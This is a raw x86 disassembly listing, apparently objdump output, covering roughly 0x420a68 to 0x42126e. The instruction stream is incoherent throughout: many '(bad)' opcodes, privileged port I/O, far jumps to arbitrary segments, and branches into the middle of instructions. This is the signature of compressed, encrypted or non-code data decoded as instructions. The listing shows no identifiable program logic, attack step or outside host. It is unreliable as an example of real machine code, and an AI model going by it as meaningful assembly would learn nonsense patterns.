  420a68:	cmp    al,0x7b
  420a6a:	les    eax,FWORD PTR [esp+ebx*2-0xd]
  420a6e:	idiv   DWORD PTR [eax-0x2a]
  420a71:	aaa    
  420a72:	hlt    
  420a73:	or     DWORD PTR [eax-0x66f36668],0xf4ce351a
  420a7d:	fbld   TBYTE PTR [ebx+edi*8]
  420a80:	outs   dx,BYTE PTR ds:[esi]
  420a81:	fstp   TBYTE PTR [ebp+0x1ad3ddda]
  420a87:	adc    DWORD PTR [eax],0x82c7d3f9
  420a8d:	das    
  420a8e:	mov    ds:0xc9e42fc8,al
  420a93:	push   cs
  420a94:	lods   eax,DWORD PTR ds:[esi]
  420a95:	adc    BYTE PTR [ebx+0x12365cdc],cl
  420a9b:	push   ecx
  420a9c:	rcr    BYTE PTR [eax-0x6f654d6c],1
  420aa2:	mov    edi,0x10d78545
  420aa7:	cs xchg cl,dh
  420aaa:	cmp    BYTE PTR [edx+edx*8-0x49],al
  420aae:	fdivr  st(1),st
  420ab0:	repnz push 0x348b1f33
  420ab6:	dec    ecx
  420ab7:	dec    esp
  420ab8:	sub    DWORD PTR [esi],ecx
  420aba:	sub    DWORD PTR [edi+0x4b],esp
  420abd:	loope  0x420a9c
  420abf:	iret   
  420ac0:	outs   dx,DWORD PTR ds:[esi]
  420ac1:	cdq    
  420ac2:	(bad)  
  420ac3:	mov    ecx,0x1761af8f
  420ac8:	fsub   st(2),st
  420aca:	pop    ecx
  420acb:	adc    ch,ah
  420acd:	xor    ebx,DWORD PTR [esi-0x6e]
  420ad0:	mov    ds,WORD PTR [edx-0x55540278]
  420ad6:	cmp    BYTE PTR [esi],bh
  420ad8:	xchg   edi,eax
  420ad9:	sbb    BYTE PTR [ecx+0x76],cl
  420adc:	adc    ebx,DWORD PTR [eax-0x6d]
  420adf:	add    bh,dl
  420ae1:	mov    ecx,DWORD PTR [ebp+0x552113e0]
  420ae7:	test   DWORD PTR [edi],ebx
  420ae9:	dec    ebx
  420aea:	pushf  
  420aeb:	push   0xcdd7c923
  420af0:	pusha  
  420af1:	inc    ebx
  420af2:	add    eax,0xc225c15d
  420af7:	cmp    al,0x72
  420af9:	xor    ah,BYTE PTR [ecx+0x45]
  420afc:	ins    BYTE PTR es:[edi],dx
  420afd:	test   BYTE PTR [ebx-0x7],0x2d
  420b01:	fcmovnb st,st(4)
  420b03:	retf   0xe507
  420b06:	xor    al,0xcd
  420b08:	popa   
  420b09:	jo     0x420af1
  420b0b:	dec    ebp
  420b0c:	(bad)  [esp+esi*1-0x30]
  420b10:	mov    dl,0x32
  420b12:	scas   al,BYTE PTR es:[edi]
  420b13:	out    0x5f,al
  420b15:	mov    esp,0x31ed7bc0
  420b1a:	ss out 0x78,al
  420b1d:	and    al,0x1a
  420b1f:	and    al,0x95
  420b21:	pop    edi
  420b22:	or     ebx,DWORD PTR es:[edx+0x5e3fdf77]
  420b29:	ror    DWORD PTR [ecx+0x74502263],cl
  420b2f:	outs   dx,BYTE PTR gs:[esi]
  420b31:	arpl   WORD PTR [ecx],dx
  420b33:	sub    ch,BYTE PTR [edi-0x7d59444e]
  420b39:	mov    esp,0x2d8723cc
  420b3e:	xor    DWORD PTR [ebp-0x75],0xca27a1cf
  420b45:	xor    BYTE PTR [ebp+ebp*2+0x2b],dl
  420b49:	out    0xe2,al
  420b4b:	jle    0x420b5e
  420b4d:	in     al,0xc8
  420b4f:	mov    ds:0x5eca9522,eax
  420b54:	mov    ah,0x46
  420b56:	pop    esp
  420b57:	jmp    0x420b4f
  420b59:	or     al,BYTE PTR [ebx+0x3525de6f]
  420b5f:	in     al,dx
  420b60:	and    ebx,DWORD PTR [ecx]
  420b62:	lea    ebx,[edi-0x4ad19a5b]
  420b68:	aam    0xc0
  420b6a:	jnp    0x420b72
  420b6c:	xchg   ebx,eax
  420b6d:	inc    ebp
  420b6e:	pop    esi
  420b6f:	mov    WORD PTR [ebx-0x9],cs
  420b72:	or     eax,0xdd83bbe
  420b77:	adc    al,0xf0
  420b79:	stc    
  420b7a:	inc    ecx
  420b7b:	in     al,dx
  420b7c:	dec    ecx
  420b7d:	fdiv   st,st(3)
  420b7f:	inc    ebx
  420b80:	xchg   esp,eax
  420b81:	jbe    0x420b2b
  420b83:	cmc    
  420b84:	pop    es
  420b85:	cmp    al,0x56
  420b87:	jg     0x420bfe
  420b89:	dec    esi
  420b8a:	out    dx,eax
  420b8b:	rol    DWORD PTR [eax+0x340d6ddb],1
  420b91:	(bad)  
  420b92:	daa    
  420b93:	out    0x9a,eax
  420b95:	xor    eax,0x29bbc80c
  420b9a:	retf   
  420b9b:	repz adc DWORD PTR [edi-0x2e],ebx
  420b9f:	jae    0x420b71
  420ba1:	inc    edi
  420ba2:	or     al,ch
  420ba4:	dec    ebp
  420ba5:	sub    BYTE PTR [esi+0x55f8fe9],cl
  420bab:	jl     0x420c29
  420bad:	xacquire xchg DWORD PTR [eax+0x19],ebx
  420bb1:	mov    ?,WORD PTR [edi-0x3abea5cb]
  420bb7:	dec    esi
  420bb8:	add    ebx,edx
  420bba:	sahf   
  420bbb:	loope  0x420c17
  420bbd:	push   esp
  420bbe:	inc    edx
  420bbf:	add    BYTE PTR [eax+0x5dd2c785],0x2f
  420bc6:	xor    BYTE PTR [edx+0x38],0x41
  420bca:	fwait
  420bcb:	sbb    eax,0x9f2a3f04
  420bd0:	idiv   DWORD PTR [edx+0x6]
  420bd3:	sub    BYTE PTR [eax+0x33],dl
  420bd6:	sub    eax,0x74159009
  420bdb:	sbb    BYTE PTR [edx-0x1a265efe],0x99
  420be2:	and    eax,0xc5a5d3e4
  420be7:	addr16 aaa 
  420be9:	mov    bl,0xae
  420beb:	jno    0x420c11
  420bed:	jge    0x420b99
  420bef:	pushf  
  420bf0:	test   BYTE PTR [edi+0x453e7c6d],bl
  420bf6:	out    dx,al
  420bf7:	leave  
  420bf8:	jle    0x420c3b
  420bfa:	sar    DWORD PTR [edi],0x13
  420bfd:	sub    dl,BYTE PTR [ebx+0x14]
  420c00:	add    BYTE PTR [eax],al
  420c02:	inc    ebx
  420c03:	inc    ecx
  420c04:	popa   
  420c05:	data16 arpl WORD PTR [esi+0x47],sp
  420c09:	rcr    DWORD PTR gs:[edi+0x16],cl
  420c0d:	xor    ch,bh
  420c0f:	mov    edx,0x815c7f69
  420c14:	add    DWORD PTR [eax],eax
  420c16:	add    eax,DWORD PTR es:[eax]
  420c19:	add    BYTE PTR [edx-0x6f],dl
  420c1c:	inc    eax
  420c1d:	mov    eax,ds:0x10c5cf25
  420c22:	jne    0x420bc5
  420c24:	je     0x420bde
  420c26:	sti    
  420c27:	je     0x420c03
  420c29:	mov    ecx,0xf92102bd
  420c2e:	imul   edi,DWORD PTR [esi+0x35],0x5f
  420c32:	push   ss
  420c33:	sar    DWORD PTR [ebp+esi*1+0x6c4eeab9],0x86
  420c3b:	dec    ebx
  420c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c3d:	idiv   DWORD PTR [edi]
  420c3f:	adc    ebx,eax
  420c41:	sbb    bl,BYTE PTR [edx+edi*4-0x45fd55c4]
  420c48:	popf   
  420c49:	out    dx,al
  420c4a:	xchg   eax,esp
  420c4c:	mov    eax,0x27e7cea6
  420c51:	aaa    
  420c52:	int    0x93
  420c54:	jmp    DWORD PTR [esi]
  420c56:	jg     0x420c40
  420c58:	inc    esp
  420c59:	cmp    BYTE PTR [eax-0x687da085],bh
  420c5f:	ret    0xdd09
  420c62:	push   0x1d
  420c64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c65:	stos   BYTE PTR es:[edi],al
  420c66:	test   DWORD PTR [ecx],ebp
  420c68:	jno    0x420c75
  420c6a:	jnp    0x420c0e
  420c6c:	inc    esp
  420c6d:	fnsave ds:0x7dbc5ccf
  420c73:	pop    ebp
  420c74:	mov    ebp,0x30a1e416
  420c79:	call   0x358f44de
  420c7e:	cmp    ecx,DWORD PTR [eax]
  420c80:	fs addr16 (bad) 
  420c83:	cmp    eax,0xf7eb5faf
  420c88:	nop
  420c89:	jae    0x420ce7
  420c8b:	outs   dx,DWORD PTR ds:[esi]
  420c8c:	fisubr DWORD PTR [ebp-0x5a]
  420c8f:	sub    eax,0xab10cc18
  420c94:	add    cl,dh
  420c96:	mov    esp,0x3b9fdeb6
  420c9b:	lds    esp,FWORD PTR [edi]
  420c9d:	add    dh,BYTE PTR [edx-0x7e]
  420ca0:	mov    cl,0x20
  420ca2:	fiadd  DWORD PTR [eax+0x2f6fe942]
  420ca8:	dec    cl
  420caa:	jno    0x420c8a
  420cac:	enter  0xb614,0x52
  420cb0:	repz ja 0x420d29
  420cb3:	out    0x3e,al
  420cb5:	mov    al,0x6d
  420cb7:	mov    eax,ds:0x1f1eae17
  420cbc:	jb     0x420cf4
  420cbe:	inc    ebp
  420cbf:	pushf  
  420cc0:	jmp    0x420d21
  420cc2:	mov    esp,0x2db32ee6
  420cc7:	(bad)  
  420cc8:	ds test eax,0xc4acc9c2
  420cce:	lods   al,BYTE PTR ds:[esi]
  420ccf:	sahf   
  420cd0:	or     eax,0x93d9849e
  420cd5:	dec    ebp
  420cd6:	adc    eax,DWORD PTR [edi+0x43]
  420cd9:	test   DWORD PTR [ebx-0x66ec110c],ecx
  420cdf:	fist   WORD PTR [esi]
  420ce1:	bound  ebp,QWORD PTR cs:[edx+0x249dad]
  420ce8:	mov    ecx,0x22668fda
  420ced:	pop    ecx
  420cee:	int3   
  420cef:	or     BYTE PTR [eax-0x19be9a81],ch
  420cf5:	or     BYTE PTR [edx-0x2c],cl
  420cf8:	pop    edi
  420cf9:	xor    DWORD PTR [ecx+0x3157f009],esp
  420cff:	push   edx
  420d00:	mov    cl,0xfc
  420d02:	gs inc edx
  420d04:	popa   
  420d05:	and    eax,0x3a172e76
  420d0a:	call   0x6fe5:0xebe45c0a
  420d11:	pop    es
  420d12:	jbe    0x420d81
  420d14:	mov    dl,0xc3
  420d16:	and    al,0x3d
  420d18:	jmp    0x420d51
  420d1a:	retf   
  420d1b:	sub    BYTE PTR [ebx],al
  420d1d:	mov    edi,0x6c468750
  420d22:	jle    0x420cf3
  420d24:	outs   dx,DWORD PTR ds:[esi]
  420d25:	xor    DWORD PTR [edx],0x41ca5ca7
  420d2b:	push   0xffffff98
  420d2d:	bound  esp,QWORD PTR [esi]
  420d2f:	pop    eax
  420d30:	pop    ds
  420d31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d32:	cmp    BYTE PTR [esi+0x5b],bl
  420d35:	xor    eax,0x42a1a240
  420d3a:	sbb    DWORD PTR [ebp-0xb],esp
  420d3d:	fsubr  DWORD PTR [edx]
  420d3f:	mov    DWORD PTR [eax],eax
  420d41:	fidiv  DWORD PTR [edx-0x3799eeba]
  420d47:	adc    bl,BYTE PTR [ecx+0xc88cd4d]
  420d4d:	iret   
  420d4e:	sbb    eax,0x8369181c
  420d53:	arpl   WORD PTR [eax-0x634eded3],dx
  420d59:	mov    bh,0xf2
  420d5b:	dec    esi
  420d5c:	test   al,0x40
  420d5e:	ret    0x808
  420d61:	or     al,0xcd
  420d63:	loop   0x420cf8
  420d65:	push   ss
  420d66:	(bad)  
  420d67:	mov    bh,0x5d
  420d69:	hlt    
  420d6a:	shl    BYTE PTR [ecx+0x38eb0b62],1
  420d70:	or     eax,DWORD PTR [ebp+0x7c]
  420d73:	int3   
  420d74:	xor    bh,BYTE PTR [edi-0x3]
  420d77:	cmc    
  420d78:	or     eax,0xdafb6429
  420d7d:	in     al,dx
  420d7e:	arpl   bx,bx
  420d80:	popa   
  420d81:	fcom   QWORD PTR [eax]
  420d83:	mov    ds:0x1635e8f9,al
  420d88:	sub    BYTE PTR [edx+0x75],0xe0
  420d8c:	rcl    BYTE PTR [ebx+0x19],cl
  420d8f:	jmp    0x6856:0xbd4a9735
  420d96:	jno    0x420db0
  420d98:	fisub  DWORD PTR [ebx]
  420d9a:	xor    BYTE PTR es:[esi],cl
  420d9d:	ins    DWORD PTR es:[edi],dx
  420d9e:	inc    ax
  420da0:	or     al,ch
  420da2:	push   ds
  420da3:	fisttp WORD PTR [esi-0x6a02270c]
  420da9:	fsubr  st,st(0)
  420dab:	popa   
  420dac:	jecxz  0x420d57
  420dae:	push   edx
  420daf:	ins    DWORD PTR es:[edi],dx
  420db0:	jp     0x420dba
  420db2:	or     eax,0xb2b7657
  420db7:	cs dec ecx
  420db9:	inc    eax
  420dba:	loope  0x420db6
  420dbc:	jle    0x420d9d
  420dbe:	shl    BYTE PTR [ecx],0x4d
  420dc1:	loop   0x420e2c
  420dc3:	fcmovb st,st(4)
  420dc5:	pop    ds
  420dc6:	(bad)  [eax-0x1d]
  420dc9:	js     0x420d95
  420dcb:	pop    ds
  420dcc:	jge    0x420dfe
  420dce:	int3   
  420dcf:	xchg   ebx,eax
  420dd0:	in     eax,dx
  420dd1:	push   esi
  420dd2:	jno    0x420e31
  420dd4:	mov    ebx,0xba27b8bc
  420dd9:	cmp    BYTE PTR [eax+0x12],ch
  420ddc:	sub    cl,ah
  420dde:	cmp    eax,0x34a6c822
  420de3:	ins    DWORD PTR es:[edi],dx
  420de4:	mov    al,0x8d
  420de6:	rcr    BYTE PTR [ebx],1
  420de8:	sub    al,0x4a
  420dea:	mov    DWORD PTR [eax+0x3c4cf723],ebx
  420df0:	pushf  
  420df1:	pop    ds
  420df2:	montmul (bad)
  420df3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420df4:	inc    edi
  420df5:	add    eax,0x3d2ef54c
  420dfa:	shl    BYTE PTR [eax-0x75465b8],cl
  420e00:	mov    al,0xf6
  420e02:	push   ss
  420e03:	dec    ecx
  420e04:	(bad)  
  420e05:	and    BYTE PTR [eax-0x3a],dh
  420e08:	gs int 0x32
  420e0b:	cmp    al,0x9e
  420e0d:	and    DWORD PTR [ebx+0x6d],ebp
  420e10:	mov    bl,BYTE PTR [eax]
  420e12:	imul   eax,DWORD PTR [ecx+0x5b],0x0
  420e16:	jno    0x420e3e
  420e18:	ins    DWORD PTR es:[edi],dx
  420e19:	nop
  420e1a:	addr16 sbb al,0xb4
  420e1d:	dec    edx
  420e1e:	jo     0x420e6f
  420e20:	loopne 0x420db8
  420e22:	test   al,0xe7
  420e24:	call   edx
  420e26:	int    0x48
  420e28:	xchg   ebx,eax
  420e29:	mov    eax,ds:0xd725517a
  420e2e:	fisubr DWORD PTR [esi-0x16]
  420e31:	cdq    
  420e32:	xchg   BYTE PTR [eax],dh
  420e34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e35:	jp     0x420dce
  420e37:	data16 and BYTE PTR es:[ecx+0x777b7e5b],ch
  420e3f:	jnp    0x420e0d
  420e41:	icebp  
  420e42:	cli    
  420e43:	test   BYTE PTR [eax-0x75],0x23
  420e47:	mov    esp,0x4c39f737
  420e4c:	mov    ah,0xd8
  420e4e:	fstp   QWORD PTR [esi-0x135d835]
  420e54:	mov    edx,0xf40c4d43
  420e59:	fidivr WORD PTR [edx]
  420e5b:	or     DWORD PTR [eax+0x4308ae6a],eax
  420e61:	cld    
  420e62:	(bad)  
  420e63:	or     cl,ch
  420e65:	aaa    
  420e66:	xor    BYTE PTR [eax],ch
  420e68:	mov    DWORD PTR [edi-0xc],ecx
  420e6b:	cs inc ecx
  420e6d:	or     DWORD PTR [esi-0x1c],0x72d8e7c0
  420e74:	xlat   BYTE PTR ds:[ebx]
  420e75:	fisttp WORD PTR [edi+0x697c5f4c]
  420e7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e7c:	push   0x9a5350f9
  420e81:	cmc    
  420e82:	add    al,0x4
  420e84:	jmp    0x420ecc
  420e86:	cmp    ecx,edi
  420e88:	jb     0x420eac
  420e8a:	test   eax,0x8178485f
  420e8f:	pop    edi
  420e90:	mov    edi,0x66aa47be
  420e95:	loopne 0x420e96
  420e97:	xor    al,0xc9
  420e99:	mov    edx,0x33f4b433
  420e9e:	pop    ebx
  420e9f:	ret    0x65ea
  420ea2:	adc    DWORD PTR [edx-0x574c051a],eax
  420ea8:	adc    al,0x45
  420eaa:	inc    ebp
  420eab:	dec    eax
  420eac:	aad    0xa8
  420eae:	xor    eax,DWORD PTR [edx+0x75]
  420eb1:	neg    DWORD PTR [ebx-0x35]
  420eb4:	mov    edi,?
  420eb6:	mov    dl,0xf2
  420eb8:	out    0x87,eax
  420eba:	and    eax,ebx
  420ebc:	xchg   edi,eax
  420ebd:	fcmovnbe st,st(5)
  420ebf:	add    ah,BYTE PTR [esi-0x4a2f0a5e]
  420ec5:	test   al,0x8a
  420ec7:	dec    edi
  420ec8:	push   esp
  420ec9:	or     ah,cl
  420ecb:	fcmovu st,st(0)
  420ecd:	mov    al,0xb3
  420ecf:	mov    ?,WORD PTR [edx+0x7afa3a7a]
  420ed5:	shl    BYTE PTR [esi+0x4f1cf4ed],cl
  420edb:	pop    ss
  420edc:	push   ebp
  420edd:	fdiv   DWORD PTR [edx]
  420edf:	jo     0x420f01
  420ee1:	mov    ecx,0x67a9bad1
  420ee6:	dec    esp
  420ee7:	jno    0x420f4a
  420ee9:	add    BYTE PTR [eax],0x19
  420eec:	mov    ebx,0xc802177e
  420ef1:	call   0xa13:0xcf195595
  420ef8:	jae    0x420f68
  420efa:	jge    0x420f3e
  420efc:	idiv   BYTE PTR [edx-0x1964d272]
  420f02:	jb     0x420efa
  420f04:	mov    BYTE PTR [ecx],ch
  420f06:	mov    bp,0xc410
  420f0a:	in     eax,0x4c
  420f0c:	xchg   ebx,eax
  420f0d:	and    BYTE PTR es:[esi+0x15d585e3],bl
  420f14:	addr16 pusha 
  420f16:	mov    ecx,0x1a50ced9
  420f1b:	arpl   di,sp
  420f1d:	mov    bl,0xf4
  420f1f:	scas   eax,DWORD PTR es:[edi]
  420f20:	out    0x4c,eax
  420f22:	loopne 0x420eef
  420f24:	sbb    dl,bh
  420f26:	push   edx
  420f27:	xlat   BYTE PTR ds:[ebx]
  420f28:	sub    BYTE PTR [ebp+0x25],bh
  420f2b:	arpl   WORD PTR [ebx+0x28b5b7b],sp
  420f31:	mov    ebp,0x59ae0789
  420f36:	jl     0x420f02
  420f38:	mov    esi,0x446ab56f
  420f3d:	cli    
  420f3e:	call   0x8b421028
  420f43:	jmp    0xfacb:0x3bf31bd3
  420f4a:	in     al,dx
  420f4b:	jg     0x420f84
  420f4d:	loopne 0x420f52
  420f4f:	add    bh,0xe9
  420f52:	add    BYTE PTR [ecx+eax*1+0x32600],0x0
  420f5a:	mov    ebp,DWORD PTR [edx+0x12]
  420f5d:	fistp  WORD PTR [ebp-0x71]
  420f60:	lock nop
  420f62:	sub    dh,ah
  420f64:	stos   DWORD PTR es:[edi],eax
  420f65:	cmp    DWORD PTR [ecx],0xffffff90
  420f68:	push   edi
  420f69:	cmc    
  420f6a:	adc    al,0xee
  420f6c:	cmovs  ecx,eax
  420f6f:	mov    esi,0x41b63580
  420f74:	lods   eax,DWORD PTR ds:[esi]
  420f75:	xchg   BYTE PTR [edi],al
  420f77:	add    al,dh
  420f79:	fdiv   QWORD PTR [ebp-0x73]
  420f7c:	not    DWORD PTR [eax+eax*1]
  420f7f:	out    dx,eax
  420f80:	xor    BYTE PTR [edi-0x7f],bh
  420f83:	jno    0x420f7a
  420f85:	sbb    ecx,edi
  420f87:	sbb    cl,BYTE PTR [edi+0x9]
  420f8a:	enter  0x1688,0xa
  420f8e:	mov    esp,0xa7274e97
  420f93:	mov    bh,0x80
  420f95:	mov    ch,0x13
  420f97:	js     0x420f44
  420f99:	xlat   BYTE PTR ds:[ebx]
  420f9a:	mov    ecx,0xddf6091
  420f9f:	push   ebx
  420fa0:	dec    ebp
  420fa1:	and    DWORD PTR [esi+0x46],ebp
  420fa4:	sub    bl,ah
  420fa6:	adc    BYTE PTR ds:[edi],0xe6
  420faa:	addr16 dec ebp
  420fac:	loopne 0x420fbd
  420fae:	or     eax,0x2534d8dc
  420fb3:	jno    0x420fe1
  420fb5:	adc    BYTE PTR [ebx+0x64],ah
  420fb8:	out    0xaf,al
  420fba:	or     DWORD PTR [edx+0x64],esi
  420fbd:	mov    edi,0xe66cf900
  420fc2:	retf   
  420fc3:	push   ebx
  420fc4:	jge    0x421036
  420fc6:	fidivr DWORD PTR ds:0x3e945835
  420fcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fcd:	jl     0x42102f
  420fcf:	pop    edx
  420fd0:	mov    esi,0xa1d59dff
  420fd5:	cmp    al,0x0
  420fd7:	scas   eax,DWORD PTR es:[edi]
  420fd8:	imul   esi,DWORD PTR [ebx],0x3c5070cf
  420fde:	fstp   QWORD PTR [edx+0x2f9c48c2]
  420fe4:	cs in  eax,0xdf
  420fe7:	xchg   ebp,eax
  420fe8:	scas   al,BYTE PTR es:[edi]
  420fe9:	enter  0x52be,0xd
  420fed:	ja     0x420f71
  420fef:	inc    BYTE PTR [ecx-0xd]
  420ff2:	xchg   esp,eax
  420ff3:	cmp    al,0xe5
  420ff5:	dec    esp
  420ff6:	lahf   
  420ff7:	jbe    0x420fc4
  420ff9:	mov    esp,0xed153303
  420ffe:	push   0x3d3175eb
  421003:	pop    ds
  421004:	pop    ecx
  421005:	jo     0x420ff9
  421007:	je     0x42104f
  421009:	inc    edi
  42100a:	mov    bl,0x25
  42100c:	out    0x26,eax
  42100e:	fsubrp st(4),st
  421010:	imul   edi,ecx,0xffffff8d
  421013:	inc    esi
  421014:	mov    DWORD PTR [ecx-0x59d315fb],edx
  42101a:	mov    ebp,esi
  42101c:	adc    bh,BYTE PTR [eax+0x197b105e]
  421022:	bound  eax,QWORD PTR [ebx+0x1e46c478]
  421028:	mov    BYTE PTR [ebp+0x42],0x81
  42102c:	jle    0x42100e
  42102e:	int    0x64
  421030:	hlt    
  421031:	stc    
  421032:	xchg   esp,eax
  421033:	lahf   
  421034:	and    DWORD PTR [ebx+edi*2],ebx
  421037:	nop
  421038:	mov    edi,0xa06b2a6a
  42103d:	bound  eax,QWORD PTR [ebx+0x436e4b36]
  421043:	cmp    dh,BYTE PTR [ecx+0x6]
  421046:	mov    edi,0x13ba6d27
  42104b:	push   ss
  42104c:	loop   0x421036
  42104e:	xor    DWORD PTR [eax-0x65],0xd
  421052:	icebp  
  421053:	xor    edi,ecx
  421055:	sub    al,0x15
  421057:	(bad)  
  421058:	adc    eax,DWORD PTR [ecx]
  42105a:	mov    ah,0x8e
  42105c:	mov    esp,0xd1b1e2dd
  421061:	pop    eax
  421062:	adc    al,0x2c
  421064:	stos   DWORD PTR es:[edi],eax
  421065:	add    BYTE PTR [edi],al
  421067:	addr16 mov al,0xca
  42106a:	aad    0x95
  42106c:	lock retf 0xcefe
  421070:	xor    dh,BYTE PTR ds:0xcc800531
  421076:	les    eax,FWORD PTR ds:0x240bdc3a
  42107c:	push   esp
  42107d:	cwde   
  42107e:	jp     0x421066
  421080:	mov    ds:0x447f79d9,eax
  421085:	in     al,0x3b
  421087:	mov    fs,WORD PTR [ebp+0x19]
  42108a:	mov    ebx,0x95dc83a1
  42108f:	dec    edx
  421090:	jbe    0x42109b
  421092:	retf   0xcf4a
  421095:	mov    ds:0xa0424b84,eax
  42109a:	lods   al,BYTE PTR ds:[esi]
  42109b:	ror    ebp,1
  42109d:	and    ebp,esp
  42109f:	cmp    edx,ecx
  4210a1:	or     al,BYTE PTR [eax]
  4210a3:	loop   0x42109d
  4210a5:	or     bh,bl
  4210a7:	mov    dh,0x3b
  4210a9:	loop   0x421058
  4210ab:	test   eax,0xcce5a912
  4210b0:	ds popa 
  4210b2:	cli    
  4210b3:	push   eax
  4210b4:	xor    eax,0xdf8525b4
  4210b9:	pop    esp
  4210ba:	out    0xe9,al
  4210bc:	loop   0x421107
  4210be:	xor    BYTE PTR [ebp+0x17],bl
  4210c1:	and    ecx,DWORD PTR [bp+0x1df9]
  4210c6:	fsubr  QWORD PTR [esi-0x4c]
  4210c9:	push   DWORD PTR [ecx-0x11]
  4210cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210cd:	jmp    0x421053
  4210cf:	push   ds
  4210d0:	mov    ebx,0x84a59a8b
  4210d5:	inc    edi
  4210d6:	mov    dl,0xfa
  4210d8:	xchg   ecx,eax
  4210da:	ins    DWORD PTR es:[edi],dx
  4210db:	push   0x8489c98e
  4210e0:	fcmovnbe st,st(6)
  4210e2:	shl    DWORD PTR es:[ecx+edi*8-0xa9d4344],cl
  4210ea:	push   ss
  4210eb:	sub    BYTE PTR [esi+0x79],al
  4210ee:	mov    ds:0x1bc41b4,al
  4210f3:	pop    ds
  4210f4:	in     eax,dx
  4210f5:	inc    eax
  4210f6:	icebp  
  4210f7:	lods   al,BYTE PTR ds:[esi]
  4210f8:	adc    eax,DWORD PTR [eax-0x7b172460]
  4210fe:	jecxz  0x421172
  421100:	jnp    0x421136
  421102:	lods   al,BYTE PTR ds:[esi]
  421103:	add    al,0x28
  421105:	inc    edi
  421106:	xchg   ecx,eax
  421108:	sub    al,0xf6
  42110a:	imul   edi,DWORD PTR [eax+0x4730aa51],0xffffffda
  421111:	mov    esp,0x4a3e2c5c
  421116:	or     eax,0x3288dde9
  42111b:	jnp    0x4210c2
  42111d:	clc    
  42111e:	push   ss
  42111f:	inc    esi
  421120:	sar    BYTE PTR [edi+0x71],0xd0
  421124:	sbb    BYTE PTR es:[edi-0x1256391a],dl
  42112b:	mov    cl,bh
  42112d:	fs jmp 0x6b40:0xda0dfec
  421135:	sbb    cl,ch
  421137:	jecxz  0x42115b
  421139:	repnz out dx,eax
  42113b:	pop    eax
  42113c:	mov    al,ds:0x7b167d33
  421141:	lea    ecx,[eax-0x4a]
  421144:	loop   0x421115
  421146:	inc    edi
  421147:	lock call 0xdbd15c1e
  42114d:	cmp    eax,DWORD PTR [ecx]
  42114f:	push   eax
  421150:	sub    al,0xa3
  421152:	xchg   esp,eax
  421153:	test   eax,0xf587d3e1
  421158:	mov    BYTE PTR [edi+esi*8-0x48],ch
  42115c:	lods   eax,DWORD PTR ds:[esi]
  42115d:	push   eax
  42115e:	push   cs
  42115f:	test   edi,edi
  421161:	mov    WORD PTR ds:0xcbf538d5,?
  421167:	jmp    0xdafab4bb
  42116c:	ficomp WORD PTR [eax+esi*8-0x5a]
  421170:	shl    DWORD PTR [edi+0x3ec2e6e7],0x6c
  421177:	ins    DWORD PTR es:[edi],dx
  421178:	aam    0x7c
  42117a:	aad    0x2d
  42117c:	in     eax,dx
  42117d:	test   eax,0x940aed7d
  421182:	or     esi,ebx
  421184:	pop    ecx
  421185:	bound  edi,QWORD PTR [edi-0x34]
  421188:	mov    ds:0x7e7f1eb9,al
  42118d:	push   ebp
  42118e:	lods   eax,DWORD PTR ds:[esi]
  42118f:	xlat   BYTE PTR ds:[ebx]
  421190:	push   edi
  421191:	xchg   edx,eax
  421192:	lahf   
  421193:	add    DWORD PTR [edi],edi
  421195:	pop    ebp
  421196:	mov    eax,ds:0x5b5a1ef0
  42119b:	ret    
  42119c:	es inc ebp
  42119e:	imul   ebx,ebp,0xbcf456b9
  4211a4:	stos   DWORD PTR es:[edi],eax
  4211a5:	mov    eax,0xe32d79a8
  4211aa:	loopne 0x421183
  4211ac:	mov    esi,DWORD PTR [edi+0x41581102]
  4211b2:	or     edx,edx
  4211b4:	ja     0x4211f1
  4211b6:	vcvtps2pd xmm1,QWORD PTR [ebx+esi*1]
  4211bb:	cmp    eax,0x2d581ff9
  4211c0:	test   eax,0xb708ac84
  4211c5:	mov    esi,0x6ee341b5
  4211ca:	mov    eax,0x22235435
  4211cf:	stc    
  4211d0:	mov    cl,0x89
  4211d2:	or     ecx,DWORD PTR [ebx-0x58b2cc52]
  4211d8:	mov    eax,ds:0x35f1879e
  4211dd:	imul   ecx,ebx,0x54
  4211e0:	jne    0x421164
  4211e2:	mov    bl,0xac
  4211e4:	mov    dl,0x82
  4211e6:	std    
  4211e7:	sbb    eax,0x2ca3bb69
  4211ec:	jp     0x4211ed
  4211ee:	mov    DWORD PTR [ecx+0x48],edi
  4211f1:	ss js  0x4211b4
  4211f4:	cs or  eax,0x24fa9f47
  4211fa:	test   al,0xa6
  4211fc:	stc    
  4211fd:	inc    ecx
  4211fe:	and    BYTE PTR [ecx],bh
  421200:	mov    eax,DWORD PTR [esi-0x78]
  421203:	sbb    BYTE PTR [ecx+ecx*4-0x16],al
  421207:	cmp    bh,BYTE PTR [edx+0x7c57801e]
  42120d:	fiadd  DWORD PTR [esi-0x63b821aa]
  421213:	mov    al,0xc2
  421215:	lea    esi,[eax]
  421217:	std    
  421218:	mov    ecx,0xc232654b
  42121d:	sub    al,0x49
  42121f:	(bad)  
  421220:	lods   eax,DWORD PTR ds:[esi]
  421221:	mov    cl,BYTE PTR [eax]
  421223:	lods   eax,DWORD PTR ds:[esi]
  421224:	mov    esp,0xc79e9ac6
  421229:	daa    
  42122a:	jo     0x4211b1
  42122c:	push   esp
  42122d:	fldcw  WORD PTR [esi]
  42122f:	adc    dh,BYTE PTR [edi+0x74]
  421232:	mov    esi,0x2363ea1d
  421237:	sar    esp,cl
  421239:	test   DWORD PTR [ebx],eax
  42123b:	out    0x3d,al
  42123d:	mov    ds:0xa7a27619,al
  421242:	dec    esi
  421243:	sbb    DWORD PTR [esi-0x71],ebp
  421246:	mov    esi,0x4782f090
  42124b:	sbb    edx,edx
  42124d:	jle    0x42122f
  42124f:	ins    BYTE PTR es:[edi],dx
  421250:	cmc    
  421251:	or     dh,BYTE PTR [eax+ebp*1+0x1c]
  421255:	enter  0x2d8b,0xec
  421259:	sub    BYTE PTR [edi-0x1c0443e0],bh
  42125f:	sub    BYTE PTR es:[eax-0x402be2dd],bl
  421266:	fs push 0x47f82982
  42126c:	js     0x421216
  42126e:	aam    0x6f
